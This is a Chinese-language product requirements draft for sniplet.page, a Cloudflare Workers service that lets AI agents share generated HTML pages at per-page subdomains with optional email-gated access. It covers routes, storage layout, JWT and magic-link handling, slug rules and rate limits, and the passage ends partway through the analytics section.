# PRD: sniplet.page

**狀態**: Draft v0.8.12(第六輪補丁 — F-32 auth_request 全站 cap、F-33 owner 操作 status code 統一、F-34 R2 create-only 寫入;可進入實作)
**作者**: XP
**日期**: 2026-04-21
**Stack**: Cloudflare Workers + R2 + KV + TypeScript + Resend

---

## 1. 產品定位

> **AI 生成網頁的分享按鈕** — 零帳號、零 API key、零設定,agent 一句話就產 URL 給使用者分享。支援公開分享,也支援限定 email 私享。

**品牌**:`sniplet.page` = 產品名 = 網域名(合一,類比 cal.com、val.town)
**命名由來**:sniplet = snippet + let,強調「一小片網頁、瞬間即得」

## 2. 問題陳述

Claude、ChatGPT 等 AI 極擅長產生 single-file HTML(report、dashboard、landing page、互動視覺化)。工程師用爽,但要「分享給主管 / 客戶 / 同事看」就全卡住:

- `.html` 副檔名非工程師不懂,心智模型對不上
- Netlify Drop / GitHub Pages 對非工程師仍有註冊、拖拽、理解 URL 等認知成本
- `.html` 在 LINE / Email 附件手機打不開、常被資安系統擋
- **想只給特定對象看,但又不想架帳號系統**
- Agent 端現有方案(shipsite.sh、Deloc、Runbox)全部要 API key、要設定,不是 AI-native

**空白在哪**:沒人做「agent 跟人之間、零摩擦的 share layer」,天生支援公開+私享雙模式。

## 3. 目標使用者

| 優先級 | 角色 | 情境 |
|---|---|---|
| P0 | Agent 使用者(個人) | 用 Claude.ai / ChatGPT / Claude Code 產 HTML 後想分享 |
| P0 | 接收者(非工程師) | 主管、客戶、家人收到 URL 要打開看 |
| P2 | Enterprise / Team | v2+(付費版) |
| P2 | Developer | 已有 Netlify / Vercel,不是主戰場 |

## 4. 核心設計原則

1. **AI-first UX**:使用者不離開 agent 對話就完成分享
2. **Zero API key**:匿名即可用,creator 認證留給 v2 付費場景
3. **Skill-first 分發**:一份 SKILL.md 跨 agent 通用,比 MCP 好分發 10 倍
4. **Happy path ≤ 10 秒**:從「幫我分享」到 URL 出現
5. **URL 看起來可信**:HTTPS、語意化 slug、無注入第三方廣告 / 追蹤
6. **Semantic by AI + 永遠 postfix**:slug 由 agent 決定語意,**server 永遠加 4 字元 postfix**(避免品牌挪用 / 釣魚混淆)
7. **Subdomain per sniplet**:每個 sniplet 自己的 subdomain,SOP 天然隔離
8. **Access control opt-in**:預設公開、可選 email 白名單,不強制帳號
9. **Creator 是主人**:creator(人或 AI)對 sniplet 有完整控制權,不做 paternalism
10. **Receiver 隱私優先**:viewer 的 email 僅用於 magic link 驗證,不作他用、不跨站追蹤

## 5. 使用情境

### 情境 A:Claude.ai Web(公開分享)
```
XP: 幫我把這個 Q3 銷售 dashboard 分享給主管
Claude: (執行 sniplet skill → 想 slug "q3-sales-dashboard"
        → POST api.sniplet.page/v1/sniplets
        → server 加 postfix)
        好的,網址在這:https://q3-sales-dashboard-a7k2.sniplet.page
        7 天後自動過期。
```

### 情境 B:Claude Code / Cursor / Codex CLI
Skill 裝在 `~/.claude/skills/`,agent 用 `curl` 執行。行為同上。

### 情境 C:接收者(非工程師)
手機 LINE 收到 URL → 點開 → RWD 自動渲染 → 不用下載、App、登入。

### 情境 D:限定 email 分享
```
XP: 幫我分享這份報告,只給 alice@co.com 和 bob@co.com 看
Claude: (POST 時帶 viewers: ["alice@co.com", "bob@co.com"])
        好的,私享網址:https://q3-private-report-m8f1.sniplet.page
        只有 Alice 和 Bob 用 email 驗證後能看。
```

### 情境 E:Alice 跨 sniplet 共用 session
```
Alice 星期一:收到 Bob 分享的 B 私享 sniplet,點 magic link 驗證 alice@co.com
           → .sniplet.page scope 的 session cookie 已建立(sub = HMAC(alice@co.com))
Alice 星期二:收到 Carol 分享的 C 私享 sniplet(Alice 在 viewers 白名單)
           → Browser 自動帶上 cookie
           → Server 驗 cookie → sub(HMAC)比對 C.meta.viewers[].h
           → 通過,不用再走 magic link 流程
```

## 6. MVP Scope

### ✅ In-Scope (Must Have)

- [ ] `POST /v1/sniplets` 匿名可用,收 HTML(≤1MB) + slug + viewers,回 subdomain URL
- [ ] **Slug 永遠 postfix**(server 自動加 4 字元 [a-z0-9],最多 retry 5 次)
- [ ] `PATCH /v1/sniplets/:slug/viewers`(帶 owner_token)支援 add + remove,可跨 access mode 切換
- [ ] `DELETE /v1/sniplets/:slug`(帶 owner_token)
- [ ] `GET /` on `{slug}.sniplet.page` 公開 / 私享雙模式
- [ ] Reserved subdomains 黑名單(撞到硬錯 400)
- [ ] **Viewers 上限**:單個 sniplet 最多 **3** 個 email(Free tier)
- [ ] 7 天 TTL + 每日 cron 清理(UTC 02:00)
- [ ] 每日總建立量 hard cap(1000 sniplets/day)
- [ ] **Email-gated sniplets 免費,無 creator 配額**
- [ ] `POST /auth/request`(含 Turnstile + per-email rate limit 3/hr、10/day + per-IP 30/day)
- [ ] **兩段式 auth**:`GET /auth/verify` 顯示確認頁(不 consume token)+ `POST /auth/consume` 實際 verify
- [ ] **One-shot token**:consumed magic links 不可 replay(KV 記錄)
- [ ] Challenge page HTML(見 §10)
- [ ] **Root `sniplet.page/` Accept header 分流**:`text/html` → 簡頁;其他 → SKILL.md 原文
- [ ] **Email reverse index(KV)**:加速 `/auth/request` 的白名單查詢
- [ ] **Workers Analytics Engine** 記 backend events(不記 PII、不碰 sniplet 內容)
- [ ] **統一嚴格 CSP**(`connect-src 'none'`、allowlist CDN),所有 sniplet 共用
- [ ] **HTTP security headers**:`X-Frame-Options: DENY`、`X-Content-Type-Options: nosniff`、`Referrer-Policy: no-referrer`
- [ ] SKILL.md v1(獨立檔案,與 PRD 並列於交付 bundle)
- [ ] Email template(純文字 + 乾淨 HTML 雙版,見 §9)

### 🚫 Out of Scope (v2+)

- Device flow / creator 帳號系統 → Pro tier 一起做
- **純自訂 slug(無 postfix、strict mode)→ Pro tier**
- Dashboard、statistics UI → Pro tier
- **Team 自訂 subdomain**(`{team}.sniplet.page/{slug}` 形式)→ v2 Team tier
- 自訂網域 → Enterprise
- 密碼保護
- Provenance metadata
- Comment / feedback 迴路
- 多檔案(v1 只收單檔 HTML)
- JWT revoke list
- Abuse report endpoint
- IP rate limit on failed GET(Cloudflare 邊緣已處理)
- Edge caching(v0.8.10 評估後移除,ROI 低)
- **Privacy Policy 本體 + GDPR Art 17 erasure 窗口**(v2 一批做,含 `privacy@` inbox 與自助 endpoint;v1 依 7 天 TTL 自然過期,見 §12)
- 第三方廣告、GA / 其他前端追蹤(**永不加**)
- Public status page → v2

## 7. 技術架構

### 7.1 Stack

- **Platform**: Cloudflare Workers + R2 + KV
- **Analytics**: Cloudflare Workers Analytics Engine
- **Language**: **TypeScript**(決定 — 見 §7.11)
- **Email**: Resend(獨立廠商,非 Cloudflare)
- **Bot protection**: Cloudflare Turnstile
- **Domain**: `sniplet.page`(`.page` TLD 為 HSTS preloaded,天然強制 HTTPS)
  - 使用者入口 + auth: `sniplet.page/*`(apex)
  - API: `api.sniplet.page/*`
  - **Sniplet 內容**: `{slug}.sniplet.page/*`(每 sniplet 自己的 subdomain)
- **Wildcard DNS**:一筆 `*.sniplet.page` A/AAAA record → Workers,處理所有 sniplet subdomain
- **Wildcard SSL**:CF Universal SSL 免費一層 wildcard cert(`*.sniplet.page`),Certificate Transparency log 只留一筆(不 per-sniplet)

### 7.2 Environment Variables
- `SESSION_JWT_SECRET` — HMAC 簽章密鑰,**僅**用於 session cookie JWT(30 天)
- `MAGIC_JWT_SECRET` — HMAC 簽章密鑰,**僅**用於 magic link JWT(15 分鐘)
- `RESEND_API_KEY`
- `TURNSTILE_SECRET`
- `EMAIL_HASH_SECRET` — HMAC-SHA256 salt for email indexing(防 rainbow table)
- `IP_HASH_SECRET` — HMAC-SHA256 salt for IP hashing(防 IPv4 離線窮舉;IPv4 僅 2³² 空間,純 SHA-256 可被現代 GPU 秒級還原)
- `ENVIRONMENT` — dev / prod

**為何 JWT 拆兩個 secret**:即使 JWT 驗證邏輯某處遺漏 `purpose` 欄位檢查,magic link token 也無法被當 session 用(因為用不同 secret 簽)。`purpose` 欄位仍保留作為第二層防禦(belt-and-suspenders)。

### 7.3 Bindings
- **R2**: `SNIPLETS`(物件儲存)
- **KV**:
  - `METER_KV`(rate limit + daily quota)
  - `EMAIL_INDEX_KV`(email → slug 反向索引)
  - `MAGIC_CONSUMED_KV`(one-shot token 狀態,防 magic link replay)
- **Analytics Engine**: `ANALYTICS`(backend events)

### 7.4 Cron Triggers
- Expression: `0 2 * * *`(UTC 02:00 daily)
- Handler:掃 R2 `sniplets/` prefix,刪除 `expires_at < now` 物件,同時清 `EMAIL_INDEX_KV` 對應條目
- **成功結尾**:寫一筆 `ANALYTICS.writeDataPoint({ blobs: ["cron_cleanup_success"], doubles: [deleted_count], indexes: [today] })`。CF Dashboard 設「24hr 無此 event → alert」

### 7.5 路由優先順序

**`api.sniplet.page`**:
| Path | Method | Handler |
|------|--------|---------|
| `/v1/sniplets` | POST | Create |
| `/v1/sniplets/:slug` | DELETE | Delete(需 owner_token) |
| `/v1/sniplets/:slug/viewers` | PATCH | Update viewers(需 owner_token) |
| `/v1/csp-report` | POST | CSP violation report ingest(寫 `csp_violation` event,回 204;見 §7.19) |
| 其他 | * | 404 |

**`sniplet.page`**(apex,auth 統一入口):
| Path | Method | Handler |
|------|--------|---------|
| `/` | GET | Root(Accept header 分流) |
| `/auth/request` | POST | Auth request(發 magic link) |
| `/auth/verify` | GET | Auth verify — **顯示確認頁,不 consume token** |
| `/auth/consume` | POST | Auth consume — **實際驗證 + set cookie + redirect** |
| `/auth/logout` | POST | Auth logout(清 cookie,MUST 驗 Origin) |
| `/security` | GET | Security policy page(§10.7) |
| `/.well-known/security.txt` | GET | RFC 9116 security.txt(§10.8) |
| `/auth/*` 其他 | * | 404 |
| `/*` 其他 | * | 404(reserved 或 unknown) |

**`{slug}.sniplet.page`**(sniplet 內容):
| Path | Method | Handler |
|------|--------|---------|
| `/` | GET | Sniplet GET(公開直接 serve,私享比對 cookie) |
| `/*` 其他 | * | 404 |

Worker 依 hostname 判斷分流(`api.sniplet.page` / `sniplet.page` / 其他 `*.sniplet.page` 為 sniplet 內容)。

### 7.6 資料流(公開)

```
Agent → POST api.sniplet.page/v1/sniplets { html, slug }
     → 驗 slug 格式 → 查保留字
     → 一律加 4 字元 postfix(最多 5 次 retry 避衝突)
     → 寫 R2 → Analytics.writeDataPoint(sniplet_created)
     ← { slug: "q3-sales-a7k2", url: "https://q3-sales-a7k2.sniplet.page",
         expires_at, owner_token, access: "public" }

Visitor → GET https://q3-sales-a7k2.sniplet.page/
       → Worker 從 hostname 取 slug → 讀 R2
       → meta.viewers == null → Serve HTML + security headers (統一嚴格 CSP)
       → Analytics.writeDataPoint(sniplet_viewed)
```

### 7.7 資料流(私享)

```
Creator → POST api.sniplet.page/v1/sniplets
         { html, slug, viewers: ["alice@co.com", ...] }   ← 明文 email from client
       → server normalize + HMAC 每個 email → 生成 { h, m } objects
       → 寫 R2 meta.viewers(全 HMAC + masked 形式)+ 寫 EMAIL_INDEX_KV(HMAC key)
       ← { slug, url, ..., access: "email-gated",
           viewers_masked: ["a***@co.com", ...] }         ← response 只回 masked,不回 HMAC

Alice(首次)
  1. GET https://q3-private-m8f1.sniplet.page/
     → 讀 R2 → meta.viewers != null + 無 cookie → 回 challenge page(§10)
     → Challenge page 的 form action 指向 https://sniplet.page/auth/request
       (apex 統一處理 auth,challenge page 做 cross-origin form POST)

  2. POST sniplet.page/auth/request { email, return_to, turnstile_token }
     → Turnstile 驗證
     → per-email rate limit(3/hr, 10/day)+ per-IP rate limit(30/day per /64)
     → Strategy C: 通過前兩關後永遠回 200
     → 內部:normalize email → HMAC → 查 EMAIL_INDEX_KV["viewer:<hmac>"]
            → 若 hit:ctx.waitUntil(resend.send(...))  ← defer,response 不等
            → 若 miss:silently skip
     → 立刻回 200(不論 hit/miss,設計目標 latency 差 < 5ms)

  3. Alice 點 email 中的連結
     → GET sniplet.page/auth/verify?t=<magic-jwt>&r=<return_to>
     → 顯示「Continue to sign in」確認頁
     → 頁面有 button → 點擊觸發 JS
     → **不 consume token,只把 token 放入頁面 form**
     → 此設計防止 email 安全掃描器自動 fetch /auth/verify 時消耗 token

  4. Alice 點確認頁的「Continue」button
     → POST sniplet.page/auth/consume { t: <token> }
     → 驗短期 JWT(MAGIC_JWT_SECRET + purpose === "magic")
     → 檢查 MAGIC_CONSUMED_KV[jti] 是否存在(若存在 → 422 already_consumed)
     → 寫 MAGIC_CONSUMED_KV[jti] = 1(TTL 16 分鐘,比 JWT exp 多 1 分鐘兜底)
     → 驗 return_to 合法性(§8 規則)
     → 簽 session JWT(SESSION_JWT_SECRET,purpose: "session")
     → Set-Cookie: st=<jwt>; HttpOnly; Secure; SameSite=Lax;
                    Domain=sniplet.page; Path=/; Max-Age=2592000
       ← Domain=sniplet.page 讓 cookie 可跨所有 *.sniplet.page
         browser 會自動附在後續 sniplet subdomain 的 request 上
     → 200 JSON { redirect: return_to }
     → Client JS 接到後 window.location = redirect

  5. GET https://q3-private-m8f1.sniplet.page/(帶 cookie)
     → Worker 驗 JWT(SESSION_JWT_SECRET + purpose === "session")
     → 取 sub(HMAC)→ 比對 meta.viewers[].h(純字串相等)→ 通過 → Serve HTML

Alice(二次,另一個 sniplet)
  1. GET https://other-sniplet-x9k2.sniplet.page/
     → Browser 自動帶 .sniplet.page scope cookie
     → Worker 驗 cookie → sub(HMAC)比對 other-sniplet 的 meta.viewers[].h
     → 在 whitelist → 直接 serve(無需再走 magic link)
     → 不在 whitelist → challenge page(Alice 需為這個 sniplet 再驗)
```

**關鍵安全屬性**:
- Cookie `Domain=sniplet.page` 讓 UX 順暢(一次驗 email 跨 sniplet 共享)
- SOP 讓每個 sniplet 在自己的 origin,**sniplet 裡的 JS 無法 fetch / window.open / iframe 其他 sniplet** — cross-sniplet isolation 由 browser 原生 SOP 保證,不靠軟體層機制
- Cookie 雖被 browser 帶去每個 `*.sniplet.page` 的 request,**但 viewer 的 HTML(被 CSP 鎖死)無法讀 cookie**(HttpOnly),也無法從平台 Worker 的執行路徑中攔截 — 平台 code 閉源,viewer 的 HTML 跑在 browser 的 viewer-side

### 7.8 Size / 格式限制
- **單個 HTML ≤ 1MB**(POST request body)
- R2 物件本身 5GB,1MB 是「這是 sniplet 不是網站」的語意硬編
- 超過直接回 400 `invalid_format`

### 7.9 R2 結構

```
sniplets/{slug}/
  ├── index.html
  └── meta.json
      {
        "created_at": "...",
        "expires_at": "...",
        "ip_hash": "...",             // HMAC-SHA256(IP_HASH_SECRET, normalize(ip));IPv6 先 normalize 到 /64 再 hash(見 §7.15)
        "owner_token_hash": "...",    // SHA-256(owner_token);constant-time 比對見 §7.14
        "viewers": [
          { "h": "<HMAC-SHA256(EMAIL_HASH_SECRET, normalize(email))>",
            "m": "a***@co.com" }      // masked display for creator UI
        ] | null
      }
```

**欄位設計說明**:
- **`ua` 欄位不存**:v1 沒有明確用途,存明文 UA 對 creator fingerprinting 有助攻。Abuse 調查若需要 UA,走 CF Workers Trace 或 CF Log(平台層),不在 application 層重複 minimize
- **`viewers`**(v0.8.11 F-11 升 v1):每個 viewer 存一個 `{ h, m }` object
  - `h`:`HMAC-SHA256(EMAIL_HASH_SECRET, normalize(email))`,與 §7.10 `EMAIL_INDEX_KV` 用同一組 secret + normalize,方便交叉查
  - `m`:masked display,格式 `{first-char}***@{domain}`(e.g., `a***@co.com`),供 PATCH / POST response 讓 creator 確認自己加了誰
  - **R2 外洩只 leak first-char + domain**,而非完整 email;攻擊者無法反推完整 email(需 `EMAIL_HASH_SECRET`)
  - 授權比對:server 對 session cookie 的 `sub`(也是 HMAC,見 §7.13)與 `viewers[].h` 做字串比較,不需明文 email
  - PATCH add/remove 接受明文 email,server 先 `normalize → HMAC`,再與 `viewers[].h` 比對(remove)或附加(add)

**Slug 在 R2 中的命名**:以 **postfix 後的完整 slug** 為 key(如 `q3-sales-a7k2`),不是 user-supplied 的 `q3-sales`。subdomain hostname 的 slug 部分直接對應 R2 key。

### 7.10 Email Reverse Index(KV)

**目的**:`/auth/request` 收到 email 時,O(1) 查出是否在任何 active sniplet 白名單。

**Email 正規化**(寫入與查詢前皆套用):
```
normalize(email) = email.trim().toLowerCase()
```

**KV Key**:`viewer:<HMAC-SHA256(EMAIL_HASH_SECRET, normalize(email))>` → `{ slugs: ["slug-a7k2", "slug-b9m3", ...] }`

**為何 HMAC 而非純 SHA-256**:若 `EMAIL_INDEX_KV` 外洩,純 SHA-256 可被 rainbow table 還原常見 email。HMAC with secret salt 讓離線破解不可能(攻擊者也要先拿到 `EMAIL_HASH_SECRET`)。

**寫入時機**:POST / PATCH viewers(全部 email 先 normalize 再 hash)
**讀取時機**:`/auth/request`(email 先 normalize 再 hash)
**清理時機**:DELETE、cron 過期清理
**KV TTL**:每個 entry 寫入時設 TTL = 對應 sniplet 剩餘 `expires_at` 秒數(最多 7 天),確保 sniplet 過期即自動失效;DELETE / cron cleanup 為兜底。RUNBOOK §2.4 `EMAIL_HASH_SECRET` dual-write migration 依賴此 TTL 讓舊 key 自然過期

**一致性**:KV 是 eventually consistent,`/auth/request` 極罕見漏發(新加 viewer 瞬間)— MVP 可接受。

**Known limitations**:
- **Gmail `+tag` 與 `.` 別名不處理**:`alice+foo@gmail.com`、`alice.smith@gmail.com`、`alicesmith@gmail.com` 實際是同一 Gmail 信箱,但 sniplet 視為三個不同 viewer。Creator 需提供精確 email。不是 security issue(Strategy C + HMAC 都守得住),但 creator 可能拼錯 variant 而困惑
- **Timing**:hit 與 miss 的 code path latency 差距 < 5ms(Resend 發送已 defer)

### 7.11 基礎設施防護依賴

sniplet.page 依賴 Cloudflare 邊緣的自動保護,**應用層不重複實作**以避免 over-engineering。

**Cloudflare Free plan 自動提供**(domain 接入即生效):

| 防護 | 範圍 |
|------|------|
| DDoS mitigation | L3/L4/L7,無限量,永久免費 |
| SSL/TLS(Universal SSL) | 自動 provision;wildcard cert 覆蓋 `*.sniplet.page` |
| 基本 WAF Managed Rulesets | OWASP top 10、SQL injection、XSS 等 |
| AI Labyrinth | 針對違反 `robots.txt` 的 AI scraper 餵假內容 |

**需手動啟用**(Cloudflare Dashboard):
- Bot Fight Mode(Security → Bots → Enable)

**應用層 (Worker) 自己處理**:
- **統一嚴格 CSP**(§7.19;所有 sniplet 共用一份,作為 per-sniplet sandbox + platform abuse 防線)
- `X-Frame-Options: DENY`(防 iframe 嵌入)
- `X-Content-Type-Options: nosniff`(防 MIME sniffing)
- `Referrer-Policy: no-referrer`
- Daily cap 1000 sniplets/day(超過回 503)
- `/auth/request` Turnstile + per-email + per-IP rate limit
- `/auth/consume` MAGIC_CONSUMED_KV 防 replay

**明確不做**:
- ❌ Edge cache(v0.8.10 移除;ROI 低、增加 invalidation 複雜度)
- ❌ IP rate limit on failed GET(Cloudflare Bot Fight Mode 已處理暴力爬蟲)
- ❌ Slug enumeration 專門防禦(成本近零 + Strategy C 已防洩漏 + postfix 本身有 46656 entropy per slug 名)
- ❌ Content scanning(v1 TTL 7 天兜底,v2 評估)
- ❌ Abuse report endpoint(v2)
- ❌ Fetch Metadata / COOP(v0.8.10 移除;subdomain-per-sniplet 架構下 SOP 已天然隔離,軟體層防線不需要)

### 7.12 為什麼 TypeScript 不是 Go

Go 在 Cloudflare Workers 需要 TinyGo → WASM bridge,R2/KV/Cache API/Analytics 無原生 SDK,`wrangler dev` 體驗差,開發時間翻倍。TypeScript 是 Workers 一等公民,Claude Code 能力最強的 stack。Go 留給 Flology 主業,本專案不混雜。

### 7.13 JWT 結構與驗證規則

**Session cookie**(30 天): `{ "sub": "<HMAC-SHA256(EMAIL_HASH_SECRET, normalize(email))>", "purpose": "session", "iat": ..., "exp": ..., "v": 1 }`
**Magic link token**(15 分鐘): `{ "sub": "<HMAC 同上>", "purpose": "magic", "return_to": "...", "jti": "...", "iat": ..., "exp": ..., "v": 1 }`

**`sub` 為 HMAC 而非明文 email(v0.8.11 F-11 升 v1)**:
- Cookie 外洩時 payload 解開也只拿到 hash,無法反推 email(需同時拿 `EMAIL_HASH_SECRET`)
- 與 `meta.viewers[].h`、`EMAIL_INDEX_KV` key 用同一演算法 + 同一 secret,授權比對是單純字串相等,無需 server 反向知道 viewer email
- `EMAIL_HASH_SECRET` 輪換會同時使所有 session、meta.viewers[].h、email index 失效;此為 event-driven 高成本操作,流程見 RUNBOOK §2.4
- `/auth/request` 與 `/auth/consume`:server 在簽 magic JWT 前先對 email 做 HMAC → 放入 `sub`;`/auth/consume` 簽 session JWT 時直接沿用 magic token 的 `sub`,不需再 hash

`jti` 是隨機 UUID,供 `/auth/consume` 比對 `MAGIC_CONSUMED_KV` 防 replay。

**簽章演算法**:`HS256`(HMAC-SHA256)。單一 Worker 不需公私鑰分離。Worker 驗簽 library 必須 enforce algorithm 為 `HS256`;**MUST reject** `alg: "none"` 與 algorithm confusion(例如攻擊者送 asymmetric token 嘗試用 HMAC secret 驗),標準 JWT library 的 known pitfall。

**Secret 使用規則**:
- Session JWT **僅**用 `SESSION_JWT_SECRET` 簽章與驗證
- Magic link JWT **僅**用 `MAGIC_JWT_SECRET` 簽章與驗證
- 兩者**不共用** secret。即使 `purpose` 欄位檢查失誤,magic token 也無法被當 session 驗證通過(簽章直接不符)
- `v` 保留給 rotate secret(見 RUNBOOK.md 的 rotation 流程)

**驗證規則(MUST)**:
- 驗 session cookie:用 `SESSION_JWT_SECRET` 驗簽 + `purpose` MUST === `"session"`,否則 reject
- 驗 magic link token(在 `/auth/consume`):用 `MAGIC_JWT_SECRET` 驗簽 + `purpose` MUST === `"magic"` + `jti` MUST 不在 `MAGIC_CONSUMED_KV`
- 沒 `purpose` 欄位或值不符 → 視為 invalid token
- 兩層防禦:即使某路徑遺漏 `purpose` 檢查,獨立 secret 仍擋下跨用

### 7.14 owner_token 規格
- **格式**:32 bytes 隨機(256-bit entropy),base64url 編碼,前綴 `ot_`;最終長度 46 字元(3 prefix + 43 base64url,無 padding)
- **生命週期**:跟 sniplet 綁定,sniplet 過期 / 被刪 → token 失效
- **儲存**:meta.json 存 SHA-256 hash,原 token 只在 POST response 回一次
- **驗證**:server 比對 hash(token)vs stored hash **必須用 constant-time 比對**;Cloudflare Workers 無 `crypto.subtle.timingSafeEqual`(不存在於 Web Crypto API),使用以下任一:
  - Node.js compat: `import { timingSafeEqual } from 'node:crypto'`(需啟 `nodejs_compat` compatibility flag)
  - 手寫 constant-time loop:
    ```ts
    function timingSafeEqual(a: Uint8Array, b: Uint8Array): boolean {
      if (a.length !== b.length) return false;
      let diff = 0;
      for (let i = 0; i < a.length; i++) diff |= a[i] ^ b[i];
      return diff === 0;
    }
    ```
  - **禁用** `===` / `==` / `Buffer.compare`(後者非 constant-time)
- **不支援** re-generation
- **Edge log hygiene**:ops 須確認 CF Log Push 未啟用,或 `Authorization` header 在 drop list(RUNBOOK §7)

### 7.15 Slug 策略與 Subdomain 架構

**格式要求**:3–40 字元、lowercase alphanumeric + hyphen、不可 `-` 開頭/結尾、不可連續 `--`
**語言規範**:agent 選 slug 時一律以**英文為底**;非英文內容做 transliterate(中文 → pinyin、日文 → romaji、韓文 → romanized)。slug 是 URL 一部分,ASCII 跨平台相容性最高,也避免 IDN punycode 顯示醜
**來源**:agent 在 POST request 中提供 `slug`
**Fallback**:沒給 slug → 8 字元隨機 ID

**衝突處理 — 永遠 postfix(v0.8.10 決定)**:
- 撞 reserved → 400 `reserved_slug`(硬錯,不 postfix)
- **一律加** `-{4 字元 [a-z0-9]}` postfix,即使 slug 本身唯一也加
- **衝突偵測機制(F-34,v0.8.12)**:R2 `put` 一律帶 `onlyIf: { etagDoesNotMatch: '*' }`(create-only 語義),`PreconditionFailed` 即為碰撞訊號,觸發重抽 postfix 重試。**不**使用「先 `head` 再 `put`」(該做法有 TOCTOU race,並發 POST 抽到同一 postfix 時後寫者會覆蓋前者,導致兩個 owner_token 指向同一物件)
- 最多 retry 5 次;仍衝突回 500 `slug_retry_exhausted`
- Response 的 `slug` / `url` 反映最終值(包含 postfix),client 必須以 response 為準

**Postfix 產生**:`crypto.getRandomValues()`(禁用 counter / timestamp,防洩漏系統流量訊號)

**為何永遠 postfix(v0.8.10 改為硬規則)**:
- 防品牌挪用:`acme-q4-earnings.sniplet.page` 不可能存在,attacker 無法搶註
- 防釣魚混淆:`paypal-login-a7k2.sniplet.page` 中的 postfix 本身是「這是臨時連結而非官方域」的視覺訊號
- CT log 只留 wildcard cert 一筆,不 per-slug 曝光
- Path-based 時代的 "你可以選到未加 postfix 版本" 誘因消失,UX 公平

**Subdomain URL 結構**:`https://{slug}.sniplet.page`
- DNS wildcard `*.sniplet.page` → Workers,per-sniplet 0 DNS 成本
- SSL wildcard `*.sniplet.page` 由 CF Universal SSL 管,免費、一張證書
- Worker 從 `request.url` 解析 hostname → 切出 slug:`new URL(request.url).hostname.replace('.sniplet.page', '')`

**v2 Pro tier**:引入 `on_conflict: "strict"`,衝突時回 409 不 postfix(但仍加 `-{postfix}` 作為品牌保護)。  
**v2 Team tier**:支援 `{team}.sniplet.page/{slug}` 形式,team-scope path-based,team 內 sniplet 共用 team subdomain(接受 team 內互信,跨 team 靠 subdomain 硬隔離)。

### 7.16 Reserved Subdomains

以下 subdomain 保留,POST 時若 slug(加 postfix 後)匹配這些 → 400 `reserved_slug`,同時 apex path 也不使用為 sniplet:

`api`, `www`, `admin`, `docs`, `status`, `blog`, `help`, `support`, `app`, `auth`, `login`, `signup`, `dashboard`, `settings`, `pricing`, `about`, `terms`, `privacy`, `security`, `mail`, `smtp`, `ns1`, `ns2`, `cdn`, `assets`, `static`, `media`, `img`, `dev`, `staging`, `test`, `prod`

Apex `sniplet.page` 路徑也 reserve `/robots.txt`、`/sitemap.xml`、`/favicon.ico`、`/.well-known/*`、`/security`。

### 7.17 Rate Limit & 成本保護

| 端點 | 機制 | 設定 |
|------|------|------|
| `POST /v1/sniplets` | Daily cap + per-IP quota | 全站 1000 / day;單一 IP 50 / day(IPv6 normalize /64) |
| `POST /auth/request` | Turnstile + per-email + per-IP + **全站 send cap** | 3/hr、10/day per email;30/day per IP(v0.8.10 加);**全站實際 Resend send 100 / day**(F-32,v0.8.12 加,預設對齊 Resend 免費 tier ≈ 3000/月;升 tier 時同步 bump) |
| `POST /auth/consume` | Per-jti one-shot(MAGIC_CONSUMED_KV) | 每個 magic link 只能 consume 一次 |
| Viewers 上限 | POST/PATCH 時檢查 | 3 email / sniplet(Free) |

**Per-IP 實作**:
- **IP normalize**:IPv4 保留完整 /32;IPv6 normalize 到 **/64**(取前 64 bit prefix)。理由:IPv6 單一家用 ISP 連線通常分配 /64,attacker 在 2⁶⁴ 位址空間內旋轉 source 會讓 per-IP counter 永遠是零。Normalize 到 /64 後,攻擊成本等同 IPv4 單一家用級別
- **KV key 格式**:`ip_quota:<HMAC-SHA256(IP_HASH_SECRET, normalized_ip)>:<YYYY-MM-DD>`、`rl_auth_ip:<...>:<YYYY-MM-DD>`
- **Hash**:用 HMAC-SHA256,符合 §7.22 logging hygiene
- **Window 類型**:fixed UTC day(每日 UTC 00:00 重置)。不採 rolling window,KV 實作簡單、cost 低;接受邊界 burst(攻擊者可在 UTC 整點前後各取 quota = 短期翻倍)作 trade-off,daily cap 1000 仍兜底
- **TTL**:KV entry 設 26 小時 TTL,自動回收

**Per-email 實作(`/auth/request`)**:
- **KV key 格式**:`rl_email:<HMAC-SHA256(EMAIL_HASH_SECRET, normalize(email))>:<hr|day>`
- **Window 類型**:fixed hour bucket(3/hr)+ fixed UTC day(10/day)

**全站 `/auth/request` send cap 實作(F-32,v0.8.12)**:
- **威脅**:attacker 手持部分真實 email 清單(breach data / 公司 directory)打 `/auth/request`,即使每封 email 有 per-email 10/day 上限、每 IP 30/day 上限,botnet + 大量 email 仍可累積觸發 Resend 實際發送 → 燒光 Resend 配額,強迫 operator 升 tier / 付費
- **KV key**:`auth_send_daily:<YYYY-MM-DD>`(counter 型 entry,TTL 26 小時)
- **計數時機**:**僅**在 `ctx.waitUntil` 實際呼叫 Resend 的 path 增加(miss path 不計);確保 cap 對應真實成本
- **Peek 時機(B2)**:Turnstile + per-email + per-IP rate limit 通過**之後**、KV email lookup **之前**,先 `METER_KV.get('auth_send_daily:<date>')`;若 >= cap 則回 `503 service_unavailable`
- **為何 peek 在 lookup 之前**:Strategy C 要求「hit / miss 兩 path latency 差 < 5ms」;peek 放在白名單判定前,雙 path 都看到同一個 503 判斷,不 leak whitelist membership
- **Cap 常數**:預設 **100 / day**(對齊 Resend 免費 tier:3000 封/月 ÷ 30 天)。升 Resend Pro($20,50k/月)時 bump 至 ~1500 / day;Scale($90,100k/月)時 ~2500 / day。建議常數化在 Worker code(`AUTH_SEND_DAILY_CAP`),deploy time 調整
- **計數 atomicity**:`GET → +1 → PUT` 非原子,與 §7.17 其他 per-IP/per-email counter 同一 trade-off;burst 窗口可穿幾個 request,但 daily cap 本質是「粗粒度成本保護」,perfect accuracy 非目標
- **Ops observability**:`503` 發生時寫 `auth_global_cap_hit` event(§7.18);dashboard alert「當日首次觸發」→ 判斷是成長 burst 還是攻擊

**Known limitation — KV eventually consistent**:
- KV `GET → INCR → PUT` 非 atomic。Attacker 在 <1 秒內 burst 200 個 requests,可能都讀到舊 counter 後才寫,實測可繞過 per-IP 50/day,在單 IP 吃到 daily cap 1000
- **兜底防禦**:全站 daily cap 1000,attacker 單日最大傷害 = 吃光當日配額
- **v2 升級路徑**:改用 Cloudflare 原生 Rate Limiting Rules(WAF layer,強一致,$5/mo 起),或 Durable Objects counter

### 7.18 Analytics(Workers Analytics Engine)

**原則**:只記 backend metric,**不碰 sniplet 內容,不記 PII,不注入任何 script 到 HTML**。

**Events**:

| Event | Blobs | Doubles | Indexes |
|-------|-------|---------|---------|
| `sniplet_created` | access_mode、country | html_size | date |
